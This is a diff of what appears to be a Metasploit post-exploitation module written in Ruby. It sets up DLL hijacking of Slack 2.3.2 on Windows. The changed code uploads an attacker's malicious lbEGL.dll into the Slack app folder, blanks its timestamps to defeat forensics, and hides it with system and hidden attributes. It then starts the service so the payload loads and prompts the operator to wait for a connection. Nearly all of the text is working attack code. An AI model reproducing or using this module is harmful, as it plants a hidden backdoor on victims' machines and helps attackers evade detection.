@@ -158,7 +158,7 @@ def ls_stage1
   p_name = "lbEGL.dll" # malicious lbEGL.dll
   s_name = "slack.exe" # service executable
   u_path = datastore['LOCAL_PATH']   # /root/lbEGL.dll
-  d_path = "c:\\Users\\tester\\AppData\\Local\\slack\\app-2.3.2" # remote path on target system
+  d_path = "%localappdata%\\slack\\app-2.3.2" # remote path on target system
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'].blank?
@@ -171,34 +171,36 @@ def ls_stage1
   end
 
 
-        # upload our executable into target system..
-        print_good(" Uploading #{p_name} agent...")
-        client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
-        sleep(1.0)
-
-      # Change payload timestamp (date:time)
-      print_good(" Blanking backdoor agent timestamp...")
-      client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
-      sleep(1.5)
-
-
-    # check if backdoor.exe exist in target
+    # check if original lbEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
-      print_good(" Backdoor agent: #{p_name} found!")
+      print_warning(" Vulnerable dll agent: #{p_name} found!")
       sleep(1.5)
-      # change attributes of backdoor to hidde it from site...
+
+      # upload our malicious lbEGL.dll into target system..
+      print_good(" Uploading: #{p_name} malicious agent...")
+      client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
+      print_good(" Uploaded: #{u_path} -> #{d_path}\\#{p_name}")
+      sleep(1.0)
+
+        # Change remote malicious lbEGL.dll timestamp (date:time)
+        print_good(" Blanking malicious dll agent timestamp...")
+        client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
+        sleep(1.5)
+
+
+      # change attributes of lbEGL.dll to hidde it from site...
       r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
       sleep(1.5)
 
           # start remote malicious service
-          print_status("Sart slack service!")
+          print_status("Sart remote slack service!")
           r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
           sleep(1.5)
 
         # task completed successefully...
-        print_status("Setup one handler and Wait everytime that system restarts OR")
-        print_status("Setup one handler and restart service: sc start #{s_name}")
+        print_status("slack 2.3.2 dll hijacking placed successefuly...")
+        print_status("Sart one handler and wait for connection!")
         print_line("")
 
       # close channel when done
